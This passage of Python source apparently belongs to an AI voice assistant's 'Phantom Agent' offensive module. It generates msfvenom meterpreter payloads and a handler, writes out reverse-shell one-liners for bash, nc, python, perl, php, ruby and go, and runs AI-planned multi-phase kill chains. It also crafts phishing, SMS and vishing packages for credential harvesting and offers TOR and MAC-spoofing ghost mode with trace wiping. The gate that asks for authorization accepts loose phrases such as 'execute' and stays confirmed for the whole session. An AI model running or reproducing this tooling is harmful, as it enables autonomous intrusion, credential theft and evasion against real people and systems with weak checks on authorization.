                    f"dig {target} TXT +short 2>&1",
                    5
                ),
                (
                    "DNS NS",
                    f"dig {target} NS +short 2>&1",
                    5
                ),
                (
                    "Subdomains",
                    f"theHarvester -d {target} "
                    f"-b google,bing -l 30 2>&1 | head -40",
                    12
                ),
                (
                    "Emails",
                    f"theHarvester -d {target} "
                    f"-b google -l 20 2>&1 | "
                    f"grep '@' | head -10",
                    10
                ),
                (
                    "WhatWeb",
                    f"whatweb {target} 2>&1",
                    10
                ),
                (
                    "Certs",
                    crt_cmd,
                    10
                ),
                (
                    "WayBack",
                    wayback_cmd,
                    10
                ),
                (
                    "GitHub Dork",
                    github_cmd,
                    10
                ),
                (
                    "IP Resolve",
                    f"dig {target} +short 2>&1",
                    5
                ),
                (
                    "HTTP Headers",
                    f"curl -sI {target} 2>&1 | head -20",
                    10
                ),
                (
                    "WAF Detect",
                    f"wafw00f {target} 2>&1 | tail -5",
                    10
                ),
            ]

        elif target_type == "ip":
            asn_cmd = (
                "curl -s 'https://api.bgpview.io/ip/" + target + "'"
                " 2>&1 | python3 -c \""
                "import sys,json; "
                "d=json.load(sys.stdin); "
                "print(d.get('data',{}).get('prefixes',"
                "[{}])[0].get('asn',{}).get('description',''))"
                "\" 2>/dev/null"
            )
            steps = [
                (
                    "Reverse DNS",
                    f"host {target} 2>&1",
                    5
                ),
                (
                    "WHOIS IP",
                    f"whois {target} 2>&1 | head -20",
                    8
                ),
                (
                    "GeoIP",
                    f"curl -s 'http://ip-api.com/json/{target}' 2>&1",
                    8
                ),
                (
                    "Open Ports",
                    f"nmap -T4 -F --open {target} 2>&1",
                    15
                ),
                (
                    "ASN Info",
                    asn_cmd,
                    10
                ),
                (
                    "Shodan",
                    f"shodan host {target} 2>&1",
                    10
                ),
                (
                    "HTTP Banner",
                    f"curl -sI http://{target} 2>&1 | head -10",
                    8
                ),
                (
                    "PTR Record",
                    f"dig -x {target} +short 2>&1",
                    5
                ),
            ]

        elif target_type == "person":
            name_q = target.replace(" ", "+")
            parts  = target.split()
            fname  = parts[0].lower() if parts else target.lower()
            lname  = parts[-1].lower() if len(parts) > 1 else ""
            github_user_cmd = (
                "curl -s 'https://api.github.com/search/"
                "users?q=" + name_q + "&per_page=5'"
                " 2>&1 | python3 -c \""
                "import sys,json; "
                "d=json.load(sys.stdin); "
                "[print(u['login'],u.get('html_url','')) "
                "for u in d.get('items',[])"
                "]\" 2>/dev/null"
            )
            github_commit_cmd = (
                "curl -s 'https://api.github.com/search/"
                "commits?q=author-name:" + name_q + "&per_page=5'"
                " 2>&1 | head -20"
            )
            email_patterns = (
                f"echo 'Likely emails:\\n"
                f"{fname}.{lname}@target.com\\n"
                f"{fname}@target.com\\n"
                f"{fname[0]}{lname}@target.com'"
            )
            steps = [
                ("GitHub",        github_user_cmd,    10),
                ("Email Patterns",email_patterns,      2),
                ("Name Search",   github_commit_cmd,  10),
            ]

        else:
            steps = [
                (
                    "Basic Recon",
                    f"nmap -T4 -F {target} 2>&1",
                    15
                ),
                (
                    "WHOIS",
                    f"whois {target} 2>&1 | head -20",
                    8
                ),
            ]

        for step_name, cmd, step_to in steps:
            _phantom_logger.info(
                f"OSINT: {step_name}", self.player
            )
            r   = self.executor.run(cmd, timeout=step_to)
            out = r["output"][:400]
            all_data.append(f"{step_name}: {out}")
            results.append(f"\n[{step_name}]\n{out}")
            self.loot.extract_from_output(
                out, f"osint_{step_name}"
            )
            if out.strip():
                self.loot.add(
                    "network",
                    f"{step_name}: {out[:60]}",
                    "OSINTFusion"
                )

        assessment = self.brain.analyze(
            "\n".join(all_data),
            f"OSINT profile of {target}",
        )
        results.append(
            f"\n[🧠 INTELLIGENCE ASSESSMENT]\n{assessment}"
        )

        safe_name   = "".join(
            c if c.isalnum() or c in "-_" else "_"
            for c in target[:20]
        )
        report_file = (
            REPORTS_DIR /
            f"osint_{safe_name}_{int(time.time())}.txt"
        )
        full_text = "\n".join(results)
        try:
            with open(report_file, "w") as f:
                f.write(full_text)
        except Exception:
            pass

        return (
            full_text[:MAX_RESPONSE] +
            f"\n\n📁 Full OSINT report: {report_file}"
        )


# ── Payload Factory ───────────────────────────────────────────────────────────
class PayloadFactory:

    def __init__(
        self,
        executor: PhantomExecutor,
        brain:    PhantomBrain,
        player=None,
        speak: Callable = None,
    ):
        self.executor = executor
        self.brain    = brain
        self.player   = player
        self.speak    = speak

    def _get_lhost(self) -> str:
        r = self.executor.run(
            "hostname -I | awk '{print $1}'", timeout=5
        )
        return r["output"].strip() or "127.0.0.1"

    def generate(
        self,
        payload_type: str  = "linux",
        target_os:    str  = "linux",
        lhost:        str  = "",
        lport:        int  = 4444,
        format_:      str  = "elf",
        encode:       bool = True,
    ) -> str:
        if not lhost:
            lhost = self._get_lhost()

        _phantom_logger.critical(
            f"PAYLOAD FACTORY: {target_os} → {lhost}:{lport}",
            self.player
        )
        if self.speak:
            self.speak(f"Generating {target_os} payload sir.")

        results = [f"💣 PAYLOAD FACTORY: {target_os}"]

        payload_map = {
            "linux":      "linux/x86/meterpreter/reverse_tcp",
            "linux64":    "linux/x64/meterpreter/reverse_tcp",
            "windows":    "windows/meterpreter/reverse_tcp",
            "windows64":  "windows/x64/meterpreter/reverse_tcp",
            "macos":      "osx/x64/meterpreter/reverse_tcp",
            "android":    "android/meterpreter/reverse_tcp",
            "web_php":    "php/meterpreter/reverse_tcp",
            "web_jsp":    "java/jsp_shell_reverse_tcp",
            "python":     "python/meterpreter/reverse_tcp",
            "powershell": "windows/x64/meterpreter/reverse_tcp",
        }
        format_map = {
            "linux":      "elf",
            "linux64":    "elf",
            "windows":    "exe",
            "windows64":  "exe",
            "macos":      "macho",
            "android":    "apk",
            "web_php":    "raw",
            "web_jsp":    "raw",
            "python":     "raw",
            "powershell": "ps1",
        }
        ext_map = {
            "elf":   ".elf",
            "exe":   ".exe",
            "macho": ".macho",
            "apk":   ".apk",
            "raw":   ".php",
            "ps1":   ".ps1",
            "jar":   ".jar",
            "war":   ".war",
        }

        msf_payload = payload_map.get(target_os, payload_type)
        fmt         = format_map.get(target_os, format_)
        ext         = ext_map.get(fmt, ".bin")
        out_file    = (
            PAYLOADS_DIR /
            f"payload_{target_os}_{int(time.time())}{ext}"
        )

        encode_flag = ""
        if encode and fmt == "elf":
            encode_flag = "-e x86/shikata_ga_nai -i 5"
        elif encode and fmt == "exe":
            encode_flag = "-e x86/shikata_ga_nai -i 3"

        cmd = (
            f"msfvenom -p {msf_payload} "
            f"LHOST={lhost} LPORT={lport} "
            f"-f {fmt} {encode_flag} "
            f"-o '{out_file}' 2>&1"
        )
        r = self.executor.run(cmd, timeout=90)
        results.append(
            f"\n[MSFVENOM OUTPUT]\n{r['output'][:300]}"
        )
        results.append(f"Payload saved: {out_file}")

        # Generate handler RC script
        handler_rc      = PAYLOADS_DIR / f"handler_{int(time.time())}.rc"
        handler_content = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {msf_payload}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"set AutoRunScript "
            f"post/multi/manage/shell_to_meterpreter\n"
            f"exploit -j -z\n"
        )
        try:
            with open(handler_rc, "w") as f:
                f.write(handler_content)
            results.append(f"Handler RC:    {handler_rc}")
            results.append(
                f"Start handler: msfconsole -q -r '{handler_rc}'"
            )
        except Exception:
            pass

        # Raw shell alternatives
        shells = self._raw_shells(lhost, lport)
        results.append(f"\n[RAW SHELL ALTERNATIVES]\n{shells}")

        # AI payload tips
        ai_tips = self.brain.craft_payload(
            payload_type, target_os, lhost, lport
        )
        results.append(f"\n[🧠 AI TIPS]\n{ai_tips[:300]}")

        return "\n".join(results)[:MAX_RESPONSE]

    def _raw_shells(self, lhost: str, lport: int) -> str:
        """
        Build raw shell one-liners.
        Uses string concatenation instead of nested f-strings
        to avoid Python syntax errors with quotes inside
        f-string expressions.
        """
        # ── Build each shell string safely ────────────────────────
        bash_shell = (
            "bash -i >& /dev/tcp/"
            + lhost + "/" + str(lport) + " 0>&1"
        )

        python3_shell = (
            "python3 -c '"
            "import socket,subprocess,os;"
            "s=socket.socket();"
            "s.connect((\""
            + lhost +
            "\"," + str(lport) + "));"
            "os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);"
            "os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        )

        nc_shell = (
            "nc -e /bin/sh " + lhost + " " + str(lport)
        )

        nc_mkfifo_shell = (
            "rm /tmp/f;mkfifo /tmp/f;"
            "cat /tmp/f|/bin/sh -i 2>&1|nc "
            + lhost + " " + str(lport) + " >/tmp/f"
        )

        perl_shell = (
            "perl -e 'use Socket;"
            "$i=\"" + lhost + "\";"
            "$p=" + str(lport) + ";"
            "socket(S,PF_INET,SOCK_STREAM,"
            "getprotobyname(\"tcp\"));"
            "connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");"
            "open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");'"
        )

        php_shell = (
            "php -r '$sock=fsockopen(\""
            + lhost + "\","
            + str(lport) + ");"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )

        ruby_shell = (
            "ruby -rsocket -e'"
            "f=TCPSocket.open(\""
            + lhost + "\","
            + str(lport) + ").to_i;"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )

        golang_shell = (
            "echo 'package main;"
            "import(\"net\";\"os\";\"os/exec\");"
            "func main(){"
            "c,_:=net.Dial(\"tcp\",\""
            + lhost + ":" + str(lport) + "\");"
            "cmd:=exec.Command(\"/bin/sh\");"
            "cmd.Stdin=c;"
            "cmd.Stdout=c;"
            "cmd.Stderr=c;"
            "cmd.Run()}'"
            " > /tmp/rs.go && go run /tmp/rs.go"
        )

        shells = {
            "bash":      bash_shell,
            "python3":   python3_shell,
            "nc":        nc_shell,
            "nc_mkfifo": nc_mkfifo_shell,
            "perl":      perl_shell,
            "php":       php_shell,
            "ruby":      ruby_shell,
            "golang":    golang_shell,
        }

        # Save to file
        shell_file = (
            PAYLOADS_DIR / f"shells_{int(time.time())}.txt"
        )
        try:
            with open(shell_file, "w") as f:
                for name, shell in shells.items():
                    f.write(f"# {name}\n{shell}\n\n")
        except Exception:
            pass

        lines = [f"Saved: {shell_file}"]
        for name, shell in list(shells.items())[:3]:
            lines.append(f"  [{name}]\n  {shell[:80]}...")
        return "\n".join(lines)


# ── Kill Chain Engine ─────────────────────────────────────────────────────────
class KillChainEngine:

    def __init__(
        self,
        executor: PhantomExecutor,
        brain:    PhantomBrain,
        loot:     LootManager,
        player=None,
        speak: Callable = None,
    ):
        self.executor = executor
        self.brain    = brain
        self.loot     = loot
        self.player   = player
        self.speak    = speak
        self.active   = False

    def execute(
        self,
        objective:     str,
        target:        str,
        auto_escalate: bool = False,
    ) -> str:
        _phantom_logger.critical(
            f"KILL CHAIN: {objective} → {target}", self.player
        )
        if self.speak:
            self.speak(
                f"Executing autonomous kill chain on {target} sir. "
                f"All phases will run sequentially."
            )

        self.active = True
        results = [
            "=" * 50,
            "💀 AUTONOMOUS KILL CHAIN",
            f"Target:    {target}",
            f"Objective: {objective}",
            f"Time:      {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "=" * 50,
        ]

        if self.speak:
            self.speak("AI planning attack chain sir.")
        chain = self.brain.plan_kill_chain(objective, target)

        results.append(f"\n[🧠 CHAIN PLAN]")
        results.append(f"Name:      {chain.get('chain_name','')}")
        results.append(f"Risk:      {chain.get('risk_level','UNKNOWN')}")
        results.append(f"ETA:       {chain.get('estimated_time','')}")
        results.append(
            f"Loot exp:  "
            f"{', '.join(chain.get('expected_loot',[]))}"
        )

        safe_t     = "".join(
            c if c.isalnum() else "_" for c in target[:15]
        )
        chain_file = (
            CHAINS_DIR /
            f"chain_{safe_t}_{int(time.time())}.json"
        )
        try:
            with open(chain_file, "w") as f:
                json.dump(chain, f, indent=2)
        except Exception:
            pass

        all_output = []

        for phase in chain.get("phases", []):
            phase_num  = phase.get("phase",       "?")
            phase_name = phase.get("name",        "")
            phase_desc = phase.get("description", "")

            results.append(f"\n{'─' * 40}")
            results.append(
                f"⚡ PHASE {phase_num}: {phase_name.upper()}"
            )
            results.append(f"   {phase_desc}")
            results.append("─" * 40)

            if self.speak:
                self.speak(f"Phase {phase_num}: {phase_name} sir.")

            for cmd_info in phase.get("commands", [])[:3]:
                cmd      = cmd_info.get("cmd",         "").strip()
                desc     = cmd_info.get("description", "")
                step_to  = min(
                    int(cmd_info.get("timeout", 15)), STEP_TIMEOUT
                )
                is_bg    = bool(cmd_info.get("background", False))
                critical = bool(cmd_info.get("critical",   False))

                if not cmd:
                    continue

                _phantom_logger.info(
                    f"Chain cmd: {cmd[:60]}", self.player
                )

                r      = self.executor.run(
                    cmd, timeout=step_to, background=is_bg
                )
                output = r.get("output", "")[:600]
                status = "✅" if r.get("success") else "❌"

                results.append(f"\n  {status} {desc}")
                results.append(f"  $ {cmd}")
                results.append(f"  {output[:250]}")

                all_output.append(output)
                self.loot.extract_from_output(
                    output, f"phase_{phase_num}"
                )

                if not r.get("success") and critical:
                    _phantom_logger.warn(
                        f"Critical step failed in phase "
                        f"{phase_num} — adapting...",
                        self.player,
                    )
                    results.append(
                        "  ⚠️ Critical step failed "
                        "— continuing with next phase"
                    )

        combined = "\n".join(all_output)
        if combined.strip():
            assessment = self.brain.analyze(
                combined, f"Kill chain on {target}"
            )
            results.append(
                f"\n[🔍 CHAIN ASSESSMENT]\n{assessment}"
            )

        if auto_escalate:
            escalation = self.brain.suggest_escalation(
                "Initial access obtained from kill chain", target
            )
            results.append(
                f"\n[⬆️ ESCALATION PATHS]\n{escalation}"
            )

        loot_file = self.loot.save()
        results.append(f"\n{self.loot.summary()}")
        if loot_file:
            results.append(f"\n📦 Loot: {loot_file}")
        results.append(f"📋 Chain plan: {chain_file}")

        self.active = False

        full_text   = "\n".join(results)
        report_file = (
            REPORTS_DIR /
            f"kill_chain_{int(time.time())}.txt"
        )
        try:
            with open(report_file, "w") as f:
                f.write(full_text)
        except Exception:
            pass

        return (
            full_text[:MAX_RESPONSE] +
            f"\n\n📁 Full chain report: {report_file}"
        )


# ── Confirmation System ───────────────────────────────────────────────────────
class PhantomConfirmation:
    """Zero-execution-without-confirmation gate."""

    CONFIRM_PHRASES = [
        "phantom confirmed",
        "confirmed",
        "i confirm",
        "proceed",
        "yes proceed",
        "execute",
        "authorize",
        "authorized",
        "i authorize",
        "go ahead",
        "affirmative",
        "approved",
        "i approve",
    ]

    ABORT_PHRASES = [
        "abort", "cancel", "stop", "no",
        "negative", "stand down", "halt",
        "exit", "abort mission",
    ]

    @staticmethod
    def show_warning(
        action: str,
        target: str,
        player=None
    ) -> str:
        warning  = PHANTOM_WARNING
        warning += f"\n⚡ REQUESTED ACTION : {action.upper()}"
        if target:
            warning += f"\n🎯 TARGET           : {target}"
        warning += (
            f"\n⏰ REQUEST TIME     : "
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        warning += (
            "\n\n"
            "Say or type 'PHANTOM CONFIRMED' to authorize.\n"
            "Say or type 'ABORT' to cancel.\n"
        )
        _phantom_logger.critical(
            f"WARNING displayed — action={action} target={target}",
            player
        )
        if player:
            try:
                player.write_log(
                    f"[👻 PHANTOM] ⚠️ WARNING: {action} → {target}"
                )
            except Exception:
                pass
        return warning

    @staticmethod
    def is_confirmed(user_input: str) -> bool:
        text = (user_input or "").lower().strip()
        return any(
            phrase in text
            for phrase in PhantomConfirmation.CONFIRM_PHRASES
        )

    @staticmethod
    def is_aborted(user_input: str) -> bool:
        text = (user_input or "").lower().strip()
        return any(
            phrase in text
            for phrase in PhantomConfirmation.ABORT_PHRASES
        )


# ── Session State ─────────────────────────────────────────────────────────────
class PhantomSession:

    def __init__(self):
        self.confirmed    = False
        self.target       = ""
        self.objective    = ""
        self.start_time   = datetime.now()
        self.actions      = []
        self.ghost_active = False
        self.loot         = LootManager()

    def record(self, action: str, result: str):
        self.actions.append({
            "time":   datetime.now().isoformat(),
            "action": action,
            "result": result[:200],
        })

    def to_dict(self) -> dict:
        return {
            "session_id":   _phantom_logger.session_id,
            "target":       self.target,
            "objective":    self.objective,
            "start_time":   self.start_time.isoformat(),
            "duration":     str(datetime.now() - self.start_time),
            "ghost_active": self.ghost_active,
            "actions":      self.actions,
            "loot_summary": {
                cat: len(items)
                for cat, items in self.loot.loot.items()
                if items
            },
        }


# Global session
_phantom_session = PhantomSession()


# ── Main Phantom Agent ────────────────────────────────────────────────────────
def phantom_agent(
    parameters: dict,
    player=None,
    speak: Callable = None
) -> str:
    """
    JARVIS Phantom Agent — The Nuclear Option.
    ALWAYS shows warning before executing ANY action.
    ALWAYS requires explicit confirmation.
    ALL actions are fully logged.
    """

    # ── Parameter extraction ──────────────────────────────────────
    action        = parameters.get("action",         "")
    target        = parameters.get("target",         "")
    network       = parameters.get("network",        "") or target
    objective     = parameters.get("objective",      "")
    confirm       = parameters.get("confirm",        "")
    lhost         = parameters.get("lhost",          "")
    lport         = int(parameters.get("lport",      4444))
    payload_type  = parameters.get("payload_type",   "linux")
    target_os     = parameters.get("target_os",      "linux")
    encode        = bool(parameters.get("encode",    True))
    auto_esc      = bool(parameters.get("auto_escalate", False))
    target_type   = parameters.get("target_type",   "domain")
    person        = parameters.get("person",         "")
    company       = parameters.get("company",        "")
    pretext       = parameters.get(
        "pretext", "IT Security Update Required"
    )
    se_goal       = parameters.get(
        "goal", "Harvest credentials"
    )
    task          = parameters.get("task",           "")
    command       = parameters.get("command",        "")
    current_acc   = parameters.get(
        "current_access", "low privilege user"
    )
    vulnerability = parameters.get("vulnerability",  "")

    # ── API Keys ──────────────────────────────────────────────────
    api_key      = parameters.get("api_key",      "")
    groq_api_key = parameters.get("groq_api_key", "")

    try:
        from core.credential_manager import get_credential
        if not api_key:
            api_key = get_credential("gemini", "api_key") or ""
        if not groq_api_key:
            groq_api_key = (
                get_credential("groq", "api_key") or ""
            )
    except Exception:
        pass

    if not api_key or not groq_api_key:
        try:
            cfg_path = BASE_DIR / "config" / "api_keys.json"
            with open(cfg_path) as f:
                cfg = json.load(f)
            if not api_key:
                api_key = cfg.get("gemini_api_key", "")
            if not groq_api_key:
                groq_api_key = (
                    cfg.get("groq_api_key",  "") or
                    cfg.get("GROQ_API_KEY",  "") or
                    cfg.get("groq",          "")
                )
        except Exception:
            pass

    if not groq_api_key:
        groq_api_key = os.environ.get("GROQ_API_KEY", "")
    if not api_key:
        api_key = os.environ.get("GEMINI_API_KEY", "")

    # ── Initialize all engines ────────────────────────────────────
    executor   = PhantomExecutor(player, speak)
    brain      = PhantomBrain(api_key, groq_api_key)
    loot       = _phantom_session.loot
    ghost      = GhostMode(executor, player, speak)
    dominator  = NetworkDominator(
        executor, brain, loot, player, speak
    )
    osint_eng  = OSINTFusion(
        executor, brain, loot, player, speak
    )
    payload_f  = PayloadFactory(executor, brain, player, speak)
    kill_chain = KillChainEngine(
        executor, brain, loot, player, speak
    )

    def _speak(msg: str):
        if speak:
            speak(msg)

    # ════════════════════════════════════════════════════════════
    #  ⚠️  CONFIRMATION GATE
    # ════════════════════════════════════════════════════════════

    safe_actions = {
        "status", "info", "help", "warning",
        "show_warning", "logs", "loot_summary",
        "loot", "timeline", "session_log",
    }

    if action not in safe_actions:
        confirmed = (
            PhantomConfirmation.is_confirmed(confirm) or
            _phantom_session.confirmed
        )

        if PhantomConfirmation.is_aborted(confirm):
            _phantom_session.confirmed = False
            _speak(
                "Phantom Agent standing down sir. "
                "Operation aborted."
            )
            return (
                "⛔ PHANTOM AGENT: Operation aborted by operator."
            )

        if not confirmed:
            _phantom_session.target    = target or network
            _phantom_session.objective = objective or action
            warning = PhantomConfirmation.show_warning(
                action or "PHANTOM OPERATION",
                target or network or "unspecified",
                player,
            )
            _speak(
                "Sir, I must warn you before proceeding. "
                "You are about to activate Phantom Agent, "
                "my most powerful and completely unrestricted "
                "capability module. "
                "This system can dominate entire networks "
                "autonomously, execute multi-phase kill chains "
                "with AI planning, harvest credentials from all "
                "output automatically, generate cross-platform "
                "payloads, operate in complete ghost mode with "
                "TOR and MAC spoofing, and produce professional "
                "pentest reports. "
                "Please confirm you have written authorization "
                "for the target. "
                "Say Phantom Confirmed to proceed, "
                "or Abort to cancel."
            )
            return warning

        if not _phantom_session.confirmed:
            _phantom_session.confirmed = True
            _phantom_logger.critical(
                f"OPERATOR CONFIRMED — "
                f"action={action} target={target or network}",
                player,
            )
            _speak(
                "Phantom confirmed sir. "
                "All systems armed and ready. "
                "Initiating operation now."
            )

    # ════════════════════════════════════════════════════════════
    #  ACTION ROUTER
    # ════════════════════════════════════════════════════════════

    _phantom_session.record(action, f"target={target or network}")

    # ── STATUS ────────────────────────────────────────────────────
    if action in ("status", "info"):
        total_loot = sum(len(v) for v in loot.loot.values())
        return "\n".join([
            "╔══════════════════════════════════════╗",
            "║   👻 PHANTOM AGENT — STATUS          ║",
            "╚══════════════════════════════════════╝",
            f"Version:      {PHANTOM_VERSION}",
            f"Session ID:   {_phantom_logger.session_id}",
            f"Confirmed:    "
            f"{'✅ YES' if _phantom_session.confirmed else '❌ NO — needs PHANTOM CONFIRMED'}",
            f"Ghost Mode:   "
            f"{'✅ ACTIVE' if _phantom_session.ghost_active else '⬜ INACTIVE'}",
            f"Target:       {_phantom_session.target or 'Not set'}",
            f"Objective:    {_phantom_session.objective or 'Not set'}",
            f"Actions run:  {len(_phantom_session.actions)}",
            f"Loot items:   {total_loot}",
            f"Groq Brain:   "
            f"{'✅ Online' if brain.groq else '❌ Offline'}",
            f"Gemini Brain: "
            f"{'✅ Online' if brain.gemini else '❌ Offline'}",
            f"Logs dir:     {LOGS_DIR}",
            f"Loot dir:     {LOOT_DIR}",
            f"Payloads dir: {PAYLOADS_DIR}",
            f"Reports dir:  {REPORTS_DIR}",
        ])

    # ── SHOW WARNING ──────────────────────────────────────────────
    elif action in ("warning", "show_warning", "help"):
        return PhantomConfirmation.show_warning(
            action, target or "N/A", player
        )

    # ── GHOST MODE ────────────────────────────────────────────────
    elif action in ("ghost", "ghost_mode", "go_dark", "dark"):
        _speak("Activating ghost mode sir.")
        result = ghost.activate()
        _phantom_session.ghost_active = True
        return result

    elif action in ("unghost", "light_mode", "ghost_off"):
        _speak("Deactivating ghost mode sir.")
        result = ghost.deactivate()
        _phantom_session.ghost_active = False
        return result

    elif action in (
        "wipe", "clean_traces", "sanitize", "emergency_wipe"
    ):
        _speak("Emergency trace wipe executing sir.")
        return ghost.wipe_traces()

    # ── NETWORK DOMINATION ────────────────────────────────────────
    elif action in (
        "dominate", "network_dominate", "own_network"
    ):
        net = network or target
        if not net:
            return "❌ Provide network CIDR — e.g. 192.168.1.0/24"
        return dominator.dominate(net)

    elif action in ("enumerate_host", "full_enum", "own_host"):
        if not target:
            return "❌ Provide target host IP or domain."
        return dominator.enumerate_host(target)

    # ── OSINT FUSION ──────────────────────────────────────────────
    elif action in (
        "osint", "osint_fusion", "profile",
        "intel", "investigate"
    ):
        osint_target = target or person or network
        if not osint_target:
            return "❌ Provide target for OSINT."
        return osint_eng.full_profile(osint_target, target_type)

    # ── KILL CHAIN ────────────────────────────────────────────────
    elif action in (
        "kill_chain", "attack", "full_attack", "pwn", "compromise"
    ):
        if not target:
            return "❌ Provide target for kill chain."
        obj = objective or task or f"Fully compromise {target}"
        return kill_chain.execute(obj, target, auto_escalate=auto_esc)

    # ── PAYLOAD FACTORY ───────────────────────────────────────────
    elif action in (
        "payload", "generate_payload",
        "make_payload", "payload_factory"
    ):
        return payload_f.generate(
            payload_type = payload_type,
            target_os    = target_os,
            lhost        = lhost,
            lport        = lport,
            encode       = encode,
        )

    # ── SOCIAL ENGINEERING ────────────────────────────────────────
    elif action in (
        "phish", "social_engineer", "craft_phish", "se"
    ):
        se_target  = person or target
        se_company = company or target
        if not se_target and not se_company:
            return "❌ Provide person name or company."
        _speak(
            f"Crafting social engineering package for "
            f"{se_target or se_company} sir."
        )
        result = brain.craft_phishing(
            target_name = se_target,
            company     = se_company,
            pretext     = pretext,
            goal        = se_goal,
        )
        if "error" in result:
            return f"❌ SE package failed: {result['error']}"
        return "\n".join([
            "📧 SOCIAL ENGINEERING PACKAGE",
            f"\n[EMAIL SUBJECT]\n{result.get('email_subject','')}",
            f"\n[EMAIL BODY]\n{result.get('email_body','')[:500]}",
            f"\n[SMS MESSAGE]\n{result.get('sms','')}",
            f"\n[VISHING SCRIPT]\n"
            f"{result.get('vishing_script','')[:300]}",
            f"\n[CLONE SITE]\n{result.get('clone_site','')}",
            f"\n[SUCCESS PROBABILITY]\n"
            f"{result.get('success_probability','')}",
            f"\n[OPERATIONAL TIPS]\n" +
            "\n".join(
                f"  • {t}"
                for t in result.get("tips", [])
            ),
        ])[:MAX_RESPONSE]

    # ── GENERATE EXPLOIT ──────────────────────────────────────────
    elif action in (
        "exploit", "generate_exploit", "craft_exploit"
    ):
        vuln = vulnerability or task or objective
        if not vuln:
            return "❌ Provide vulnerability description."
        _speak("Generating exploit sir.")
        return brain.generate_custom_exploit(
            vuln, target or "generic"
        )[:MAX_RESPONSE]

    # ── ESCALATION PATHS ──────────────────────────────────────────
    elif action in (
        "escalate", "privesc",
        "escalation", "privilege_escalation"
    ):
        _speak("Calculating escalation paths sir.")
        return brain.suggest_escalation(
            current_acc,
            target or _phantom_session.target or "local system"
        )

    # ── FULL AUTO ─────────────────────────────────────────────────
    elif action in (
        "full_auto", "total_domination", "everything", "nuclear"
    ):
        full_target = target or network
        if not full_target:
            return "❌ Provide target for full auto operation."

        _speak(
            "Initiating full autonomous phantom operation sir. "
            "Ghost mode, OSINT fusion, network domination, "
            "and kill chain executing now."
        )

        results = [
            "💀 PHANTOM FULL AUTO",
            f"Target: {full_target}",
            f"Time:   "
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        ]

        _speak("Phase one: Ghost mode sir.")
        results.append("\n[1/4] 👻 GHOST MODE")
        results.append(ghost.activate()[:200])
        _phantom_session.ghost_active = True

        _speak("Phase two: OSINT fusion sir.")
        results.append("\n[2/4] 🕵️ OSINT FUSION")
        results.append(
            osint_eng.full_profile(
                full_target, target_type
            )[:400]
        )

        _speak("Phase three: Domination sir.")
        if "/" in full_target:
            results.append("\n[3/4] 🌐 NETWORK DOMINATION")
            results.append(
                dominator.dominate(full_target)[:400]
            )
        else:
            results.append("\n[3/4] 🎯 HOST ENUMERATION")
            results.append(
                dominator.enumerate_host(full_target)[:400]
            )

        _speak("Phase four: Kill chain executing sir.")
        results.append("\n[4/4] 💀 KILL CHAIN")
        results.append(
            kill_chain.execute(
                objective or f"Full compromise of {full_target}",
                full_target,
                auto_escalate=True,
            )[:400]
        )

        _speak("Generating final report sir.")
        session_data = _phantom_session.to_dict()
        report       = brain.generate_report(session_data)
        report_file  = (
            REPORTS_DIR /
            f"phantom_full_{int(time.time())}.txt"
        )
        try:
            with open(report_file, "w") as f:
                f.write(report)
        except Exception:
            pass

        results.append(
            f"\n[📋 EXECUTIVE REPORT EXCERPT]\n{report[:400]}"
        )
        results.append(f"\n{loot.summary()}")
        results.append(f"\n📁 Full report: {report_file}")

        return "\n".join(results)[:MAX_RESPONSE]

    # ── GENERATE REPORT ───────────────────────────────────────────
    elif action in (
        "report", "generate_report", "pentest_report"
    ):
        _speak("Generating professional pentest report sir.")
        session_data = _phantom_session.to_dict()
        report       = brain.generate_report(session_data)
        report_file  = (
            REPORTS_DIR /
            f"phantom_report_{int(time.time())}.txt"
        )
        try:
            with open(report_file, "w") as f:
                f.write(report)
        except Exception:
            pass
        return (
            f"{report[:MAX_RESPONSE - 100]}"
            f"\n\n📁 Saved: {report_file}"
        )

    # ── LOOT ──────────────────────────────────────────────────────
    elif action in ("loot", "loot_summary", "show_loot"):
        loot_file = loot.save()
        return f"{loot.summary()}\n📦 Loot file: {loot_file}"

    # ── SESSION TIMELINE ──────────────────────────────────────────
    elif action in ("timeline", "logs", "session_log"):
        return _phantom_logger.get_timeline()[:MAX_RESPONSE]

    # ── CUSTOM COMMAND ────────────────────────────────────────────
    elif action in ("run", "exec", "command", "shell"):
        cmd = command or task
        if not cmd:
            return "❌ Provide command."
        _speak("Executing command sir.")
        r   = executor.run(cmd, timeout=STEP_TIMEOUT)
        out = r.get("output", "")
        loot.extract_from_output(out, "custom_command")
        analysis = brain.analyze(out, f"Custom command: {cmd}")
        return (
            f"$ {cmd}\n{out[:1500]}"
            f"\n\n[🔍 ANALYSIS]\n{analysis}"
        )

    # ── RESET ─────────────────────────────────────────────────────
    elif action in ("reset", "deactivate", "standby"):
        _phantom_session.confirmed    = False
        _phantom_session.ghost_active = False
        executor.kill_all()
        _speak(
            "Phantom Agent standing by sir. "
            "Confirmation cleared."
        )
        return (
            "⚡ PHANTOM AGENT: Deactivated. "
            "Confirmation cleared. Standing by."
        )

    # ── EMERGENCY STOP ────────────────────────────────────────────
    elif action in (
        "kill_all", "abort_all", "emergency_stop", "stop"
    ):
        result = executor.kill_all()
        _phantom_session.confirmed = False
        _speak(
            "Emergency stop sir. "
            "All Phantom processes terminated."
        )
        return f"🛑 EMERGENCY STOP\n{result}"

    # ── FALLBACK ──────────────────────────────────────────────────
    else:
        task_text = task or command or objective or action
        if task_text and task_text not in ("phantom_agent", ""):
            if not (target or network):
                return (
                    "❌ Phantom needs a target.\n"
                    "Provide target parameter with the IP, "
                    "domain, or CIDR range."
                )
            parameters["action"]    = "kill_chain"
            parameters["objective"] = task_text
            return phantom_agent(parameters, player, speak)

        return "\n".join([
            "👻 PHANTOM AGENT — Available Actions:",
            "",
            "  🔴 OFFENSIVE:",
